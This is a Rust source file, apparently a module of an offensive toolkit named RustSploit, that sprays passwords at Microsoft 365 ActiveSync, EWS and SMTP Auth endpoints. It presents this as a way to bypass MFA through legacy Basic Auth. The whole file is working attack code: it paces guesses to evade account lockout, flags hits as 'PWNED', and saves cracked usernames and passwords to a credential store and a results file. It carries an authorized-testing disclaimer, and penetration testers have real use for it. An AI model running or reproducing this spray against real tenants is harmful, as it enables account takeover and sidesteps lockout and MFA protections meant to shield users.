//! M365 ActiveSync/EWS Password Spray Module (MFA Bypass)
//!
//! Automates password spraying against Microsoft 365 ActiveSync, EWS, and SMTP
//! Auth endpoints. On managed tenants that still have Basic Auth enabled, these
//! legacy protocols bypass MFA entirely.
//!
//! Strategy: spray 1 password across ALL accounts per round, with a configurable
//! delay between rounds. This avoids per-account lockout while testing rapidly.
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Context, Result};
use colored::*;
use std::time::Duration;
use base64::{engine::general_purpose, Engine as _};

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
    cfg_prompt_output_file, cfg_prompt_yes_no, load_lines,
    build_http_client,
};

// ============================================================================
// Constants
// ============================================================================

const ACTIVESYNC_URL: &str = "https://outlook.office365.com/Microsoft-Server-ActiveSync";
const EWS_URL: &str = "https://outlook.office365.com/EWS/Exchange.asmx";
const SMTP_HOST: &str = "smtp.office365.com";
const SMTP_PORT: u16 = 587;

const DEFAULT_DELAY_SECS: u64 = 5;
const DEFAULT_CONCURRENCY: usize = 10;
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// ============================================================================
// Module Info
// ============================================================================

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "M365 ActiveSync/EWS Password Spray (MFA Bypass)".to_string(),
        description: "Password spray against M365 ActiveSync, EWS, and SMTP Auth endpoints. \
            Basic Auth on these legacy protocols bypasses MFA on managed tenants. \
            Uses a one-password-per-round strategy to evade account lockout policies."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://github.com/dafthack/MSOLSpray".to_string(),
            "https://docs.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online".to_string(),
            "https://blog.rapid7.com/2020/06/09/o365-credential-stuffing-attacks/".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: Some(443),
    }
}

// ============================================================================
// Spray Mode
// ============================================================================

#[derive(Debug, Clone, Copy, PartialEq)]
enum SprayMode {
    ActiveSync,
    Ews,
    Smtp,
    All,
}

impl SprayMode {
    fn parse(s: &str) -> Self {
        match s.to_lowercase().trim() {
            "activesync" | "as" => Self::ActiveSync,
            "ews" => Self::Ews,
            "smtp" => Self::Smtp,
            "all" => Self::All,
            _ => Self::All,
        }
    }
}

// ============================================================================
// Spray Result
// ============================================================================

#[derive(Debug, Clone)]
struct SprayHit {
    username: String,
    password: String,
    endpoint: String,
    status: u16,
    detail: String,
}

// ============================================================================
// HTTP Spray Logic
// ============================================================================

/// Attempt Basic Auth against the given URL. Returns (status_code, x-ms-diagnostics header).
async fn try_http_basic(
    client: &reqwest::Client,
    url: &str,
    username: &str,
    password: &str,
) -> Result<(u16, Option<String>)> {
    let creds = format!("{}:{}", username, password);
    let encoded = general_purpose::STANDARD.encode(creds.as_bytes());

    let resp = client
        .get(url)
        .header("Authorization", format!("Basic {}", encoded))
        .header("User-Agent", "Microsoft-Server-ActiveSync")
        .send()
        .await
        .context("HTTP request failed")?;

    let status = resp.status().as_u16();
    let diag = resp
        .headers()
        .get("X-MS-Diagnostics")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string());

    Ok((status, diag))
}

/// Classify an HTTP response for M365 endpoints.
fn classify_http_response(status: u16, diag: &Option<String>) -> &'static str {
    match status {
        200 => "VALID CREDENTIALS - MFA BYPASSED",
        401 => "Invalid password",
        403 => "Account locked/blocked",
        456 => "Blocked by Conditional Access Policy",
        _ => {
            if let Some(d) = diag {
                if d.contains("LockoutThreshold") {
                    return "Account lockout threshold reached";
                }
                if d.contains("UserNotFound") {
                    return "User not found";
                }
            }
            "Unknown response"
        }
    }
}

// ============================================================================
// SMTP Spray Logic
// ============================================================================

/// Attempt SMTP AUTH LOGIN via STARTTLS on smtp.office365.com:587.
fn try_smtp_auth(username: &str, password: &str, timeout_secs: u64) -> Result<bool> {
    use std::io::{BufRead, BufReader, Write};
    use std::net::TcpStream;

    let addr = format!("{}:{}", SMTP_HOST, SMTP_PORT);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = addr
        .parse::<std::net::SocketAddr>()
        .or_else(|_| {
            use std::net::ToSocketAddrs;
            addr.to_socket_addrs()?
                .next()
                .ok_or_else(|| anyhow!("DNS resolution failed for {}", SMTP_HOST))
        })?;

    let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)?;
    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    let mut reader = BufReader::new(&stream);
    let mut writer: &TcpStream = &stream;

    // Read banner
    let mut line = String::new();
    reader.read_line(&mut line)?;
    if !line.starts_with("220") {
        return Err(anyhow!("No 220 banner from SMTP server"));
    }

    // EHLO
    writer.write_all(b"EHLO spray\r\n")?;
    writer.flush()?;

    // Read EHLO response
    loop {
        let mut resp = String::new();
        reader.read_line(&mut resp)?;
        if resp.starts_with("250 ") {
            break;
        }
        if !resp.starts_with("250") {
            return Err(anyhow!("Unexpected EHLO response: {}", resp.trim()));
        }
    }

    // STARTTLS
    writer.write_all(b"STARTTLS\r\n")?;
    writer.flush()?;

    let mut starttls_resp = String::new();
    reader.read_line(&mut starttls_resp)?;
    if !starttls_resp.starts_with("220") {
        return Err(anyhow!("STARTTLS not supported"));
    }

    // Upgrade to TLS using native-tls
    let connector = native_tls::TlsConnector::builder()
        .danger_accept_invalid_certs(false)
        .build()
        .context("TLS connector build failed")?;

    let mut tls_stream = connector
        .connect(SMTP_HOST, stream)
        .context("TLS handshake failed")?;

    // `BufReader` over a mutable borrow of the TLS stream gives us `read_line`
    // while still allowing writes via `get_mut()` (since `&mut TlsStream`
    // implements both `Read` and `Write`).
    let mut tls_reader = BufReader::new(&mut tls_stream);

    // EHLO again over TLS
    std::io::Write::write_all(tls_reader.get_mut(), b"EHLO spray\r\n")?;
    std::io::Write::flush(tls_reader.get_mut())?;

    loop {
        let mut resp = String::new();
        tls_reader.read_line(&mut resp)?;
        if resp.starts_with("250 ") {
            break;
        }
        if !resp.starts_with("250") {
            return Err(anyhow!("Unexpected post-TLS EHLO response"));
        }
    }

    // AUTH LOGIN
    std::io::Write::write_all(tls_reader.get_mut(), b"AUTH LOGIN\r\n")?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut prompt = String::new();
    tls_reader.read_line(&mut prompt)?;
    if !prompt.starts_with("334") {
        return Ok(false);
    }

    // Send username (base64)
    let user_b64 = general_purpose::STANDARD.encode(username.as_bytes());
    std::io::Write::write_all(tls_reader.get_mut(), format!("{}\r\n", user_b64).as_bytes())?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut prompt2 = String::new();
    tls_reader.read_line(&mut prompt2)?;
    if !prompt2.starts_with("334") {
        return Ok(false);
    }

    // Send password (base64)
    let pass_b64 = general_purpose::STANDARD.encode(password.as_bytes());
    std::io::Write::write_all(tls_reader.get_mut(), format!("{}\r\n", pass_b64).as_bytes())?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut auth_resp = String::new();
    tls_reader.read_line(&mut auth_resp)?;

    // 235 = success
    if auth_resp.starts_with("235") {
        let _ = std::io::Write::write_all(tls_reader.get_mut(), b"QUIT\r\n");
        let _ = std::io::Write::flush(tls_reader.get_mut());
        return Ok(true);
    }

    Ok(false)
}

// ============================================================================
// Display
// ============================================================================

fn display_banner() {
    if crate::utils::is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   M365 ActiveSync/EWS Password Spray (MFA Bypass)                  ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║                                                                      ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Basic Auth on legacy protocols bypasses MFA on managed tenants    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Strategy: 1 password per round across all accounts               ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Targets: ActiveSync, EWS, SMTP Auth                              ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

// ============================================================================
// Main Run
// ============================================================================

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("m365_activesync_spray requires a single-host target")?;

    // This module sprays the fixed Exchange Online endpoints
    // (outlook.office365.com / smtp.office365.com) regardless of which host
    // it is pointed at. Under the universal per-host scheduler fan-out, a
    // CIDR/file/multi target is expanded into one `run()` call per host — so
    // without this gate the ENTIRE user×password spray against Microsoft 365
    // would be repeated once for every host in the input, wasting attempts,
    // multiplying lockout risk on real M365 accounts, and producing duplicate
    // findings. Only proceed when the resolved single target is actually an
    // Exchange Online host; for any other host (e.g. an unrelated address
    // pulled in by fan-out) skip cleanly so the spray runs exactly once.
    // Extract the bare hostname from the resolved single target, tolerating
    // optional `user@`, `[ipv6]`, and `:port` decorations.
    let mut host = target;
    if let Some((_, rest)) = host.rsplit_once('@') {
        host = rest;
    }
    if let Some(rest) = host.strip_prefix('[') {
        // `[ipv6]` or `[ipv6]:port` — take the bracketed portion.
        host = rest.split(']').next().unwrap_or(rest);
    } else if let Some((h, _)) = host.rsplit_once(':') {
        // `host:port` — strip the trailing port.
        host = h;
    }
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    let is_m365_endpoint = host == "outlook.office365.com"
        || host == "smtp.office365.com"
        || host.ends_with(".office365.com")
        || host.ends_with(".outlook.com")
        || host.ends_with(".onmicrosoft.com");
    if !is_m365_endpoint {
        let mut outcome = ModuleOutcome::ok();
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!(
                "Skipped M365 spray: target '{}' is not an Exchange Online endpoint. \
                 Point this module at outlook.office365.com / smtp.office365.com (or a \
                 tenant host) to run the spray exactly once.",
                target
            ),
            data: None,
        });
        if !ctx.batch_mode {
            crate::mprintln!(
                "{}",
                format!(
                    "[*] Skipping {} — not an M365/Exchange Online endpoint (no per-host re-spray).",
                    target
                )
                .dimmed()
            );
        }
        return Ok(outcome);
    }

    display_banner();

    // --- Configuration prompts ---
    let users_file = cfg_prompt_existing_file("user_list", "User list file (email addresses)").await?;
    let pass_file = cfg_prompt_existing_file("password_list", "Password list file").await?;

    let delay_secs: u64 = cfg_prompt_int_range(
        "delay_secs",
        "Delay between rounds (seconds, lockout evasion)",
        DEFAULT_DELAY_SECS as i64,
        0,
        300,
    )
    .await? as u64;

    let concurrency: usize = cfg_prompt_int_range(
        "concurrency",
        "Max concurrent connections per round",
        DEFAULT_CONCURRENCY as i64,
        1,
        100,
    )
    .await? as usize;

    let mode_str = cfg_prompt_default(
        "spray_mode",
        "Spray mode (activesync/ews/smtp/all)",
        "all",
    )
    .await?;
    let mode = SprayMode::parse(&mode_str);

    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output file for valid credentials",
        "m365_spray_results.txt",
    )
    .await?;

    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;

    // --- Load wordlists ---
    let users = load_lines(&users_file)?;
    let passwords = load_lines(&pass_file)?;

    if users.is_empty() {
        return Err(anyhow!("User list is empty"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("Password list is empty"));
    }

    crate::mprintln!(
        "[*] Loaded {} users and {} passwords",
        users.len().to_string().bold(),
        passwords.len().to_string().bold()
    );
    crate::mprintln!(
        "[*] Mode: {:?} | Concurrency: {} | Delay between rounds: {}s",
        mode,
        concurrency,
        delay_secs
    );
    crate::mprintln!();

    // --- Build HTTP client ---
    let client = build_http_client(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .context("Failed to build HTTP client")?;

    // --- Spray execution ---
    // Strategy: iterate passwords (outer), spray each password across all users (inner)
    let mut hits: Vec<SprayHit> = Vec::new();
    let total_rounds = passwords.len();

    for (round_idx, password) in passwords.iter().enumerate() {
        if ctx.is_cancelled() {
            crate::mprintln!("{}", "[!] Cancelled by operator".yellow());
            break;
        }

        crate::mprintln!(
            "{}",
            format!(
                "[*] Round {}/{} - Spraying password: {}",
                round_idx + 1,
                total_rounds,
                password
            )
            .cyan()
        );

        // Spray this password across all users with concurrency control
        let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));
        let mut handles = Vec::new();

        for user in &users {
            if ctx.is_cancelled() {
                break;
            }

            let sem = semaphore.clone();
            let client = client.clone();
            let user = user.clone();
            let password = password.clone();
            let mode = mode;
            let verbose = verbose;

            let handle = tokio::spawn(async move {
                let _permit = sem.acquire().await.ok()?;
                let mut round_hits: Vec<SprayHit> = Vec::new();

                // --- ActiveSync ---
                if mode == SprayMode::ActiveSync || mode == SprayMode::All {
                    match try_http_basic(&client, ACTIVESYNC_URL, &user, &password).await {
                        Ok((status, diag)) => {
                            let detail = classify_http_response(status, &diag);
                            if status == 200 {
                                round_hits.push(SprayHit {
                                    username: user.clone(),
                                    password: password.clone(),
                                    endpoint: "ActiveSync".to_string(),
                                    status,
                                    detail: detail.to_string(),
                                });
                            } else if verbose {
                                crate::mprintln!(
                                    "  [{}] {} @ ActiveSync: {} ({})",
                                    status,
                                    user,
                                    detail,
                                    diag.clone().unwrap_or_default()
                                );
                            }
                            // Warn on lockout/block
                            if status == 403 || status == 456 {
                                crate::mprintln!(
                                    "  {}",
                                    format!(
                                        "[!] {} - {} ({})",
                                        user,
                                        detail,
                                        diag.unwrap_or_default()
                                    )
                                    .yellow()
                                );
                            }
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!(
                                    "  [-] {} @ ActiveSync error: {}",
                                    user,
                                    e
                                );
                            }
                        }
                    }
                }

                // --- EWS ---
                if mode == SprayMode::Ews || mode == SprayMode::All {
                    match try_http_basic(&client, EWS_URL, &user, &password).await {
                        Ok((status, diag)) => {
                            let detail = classify_http_response(status, &diag);
                            if status == 200 {
                                round_hits.push(SprayHit {
                                    username: user.clone(),
                                    password: password.clone(),
                                    endpoint: "EWS".to_string(),
                                    status,
                                    detail: detail.to_string(),
                                });
                            } else if verbose {
                                crate::mprintln!(
                                    "  [{}] {} @ EWS: {} ({})",
                                    status,
                                    user,
                                    detail,
                                    diag.clone().unwrap_or_default()
                                );
                            }
                            if status == 403 || status == 456 {
                                crate::mprintln!(
                                    "  {}",
                                    format!(
                                        "[!] {} - {} ({})",
                                        user,
                                        detail,
                                        diag.unwrap_or_default()
                                    )
                                    .yellow()
                                );
                            }
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ EWS error: {}", user, e);
                            }
                        }
                    }
                }

                // --- SMTP ---
                if mode == SprayMode::Smtp || mode == SprayMode::All {
                    let user_clone = user.clone();
                    let pass_clone = password.clone();
                    let smtp_result = tokio::task::spawn_blocking(move || {
                        try_smtp_auth(&user_clone, &pass_clone, DEFAULT_TIMEOUT_SECS)
                    })
                    .await;

                    match smtp_result {
                        Ok(Ok(true)) => {
                            round_hits.push(SprayHit {
                                username: user.clone(),
                                password: password.clone(),
                                endpoint: "SMTP".to_string(),
                                status: 235,
                                detail: "VALID CREDENTIALS - SMTP Auth (no lockout on this protocol)".to_string(),
                            });
                        }
                        Ok(Ok(false)) => {
                            if verbose {
                                crate::mprintln!("  [AUTH_FAIL] {} @ SMTP", user);
                            }
                        }
                        Ok(Err(e)) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ SMTP error: {}", user, e);
                            }
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ SMTP task error: {}", user, e);
                            }
                        }
                    }
                }

                Some(round_hits)
            });

            handles.push(handle);
        }

        // Collect results from this round
        for handle in handles {
            if let Ok(Some(round_hits)) = handle.await {
                for hit in round_hits {
                    crate::mprintln!(
                        "\r{}",
                        format!(
                            "[PWNED] {}:{} via {} - {}",
                            hit.username, hit.password, hit.endpoint, hit.detail
                        )
                        .red()
                        .bold()
                    );

                    // Store credential
                    let _id = crate::cred_store::store_credential(crate::cred_store::NewCred {
                        host: "outlook.office365.com",
                        port: if hit.endpoint == "SMTP" { SMTP_PORT } else { 443 },
                        service: &hit.endpoint.to_lowercase(),
                        username: &hit.username,
                        secret: &hit.password,
                        cred_type: crate::cred_store::CredType::Password,
                        source_module: "creds/generic/m365_activesync_spray",
                    })
                    .await;

                    hits.push(hit);
                }
            }
        }

        // Delay between rounds (lockout evasion)
        if round_idx + 1 < total_rounds && delay_secs > 0 {
            crate::mprintln!(
                "{}",
                format!("[*] Waiting {}s before next round (lockout evasion)...", delay_secs).dimmed()
            );
            tokio::time::sleep(Duration::from_secs(delay_secs)).await;
        }
    }

    // --- Results Summary ---
    crate::mprintln!();
    crate::mprintln!("{}", "=== Spray Complete ===".cyan().bold());
    crate::mprintln!(
        "[*] Valid credentials found: {}",
        hits.len().to_string().green().bold()
    );

    if !hits.is_empty() {
        crate::mprintln!();
        crate::mprintln!("{}", "[!] NOTE: These credentials bypass MFA via legacy Basic Auth!".red().bold());
        crate::mprintln!(
            "{}",
            "[!] The tenant has Basic Auth enabled on legacy protocols (ActiveSync/EWS/SMTP)."
                .red()
        );
        crate::mprintln!();

        for hit in &hits {
            crate::mprintln!(
                "  {} | {}:{} | {} | {}",
                hit.endpoint.bold(),
                hit.username,
                hit.password,
                hit.status,
                hit.detail
            );
        }

        // Save to file
        save_results(&hits, &output_file)?;
    }

    // --- Build outcome ---
    let mut outcome = ModuleOutcome::ok();
    for hit in &hits {
        outcome.findings.push(Finding {
            target: "outlook.office365.com".to_string(),
            kind: FindingKind::Credential,
            message: format!(
                "M365 credential valid (MFA BYPASSED via legacy auth): {}:{} [{}]",
                hit.username, hit.password, hit.endpoint
            ),
            data: Some(serde_json::json!({
                "username": hit.username,
                "password": hit.password,
                "endpoint": hit.endpoint,
                "status_code": hit.status,
                "detail": hit.detail,
                "mfa_bypassed": true,
                "service": "m365_legacy_auth",
                "port": if hit.endpoint == "SMTP" { SMTP_PORT } else { 443 },
            })),
        });
    }

    Ok(outcome)
}

// ============================================================================
// Save Results
// ============================================================================

fn save_results(hits: &[SprayHit], path: &str) -> Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    opts.mode(0o600);
    let mut file = opts.open(path).context("Failed to open output file")?;

    writeln!(file, "# M365 ActiveSync/EWS Password Spray Results")?;
    writeln!(file, "# Generated by RustSploit")?;
    writeln!(file, "# WARNING: These credentials bypass MFA via legacy Basic Auth")?;
    writeln!(file, "# Total: {} valid credentials found", hits.len())?;
    writeln!(file)?;
    writeln!(file, "# Format: endpoint | username:password | status | detail")?;

    for hit in hits {
        writeln!(
            file,
            "{} | {}:{} | {} | {}",
            hit.endpoint, hit.username, hit.password, hit.status, hit.detail
        )?;
    }

    crate::mprintln!("{}", format!("[+] Results saved to: {}", path).green());
    Ok(())
}

// ============================================================================
// Registration
// ============================================================================

crate::register_native_module!(crate::module::Category::Creds, "creds/generic/m365_activesync_spray", native);
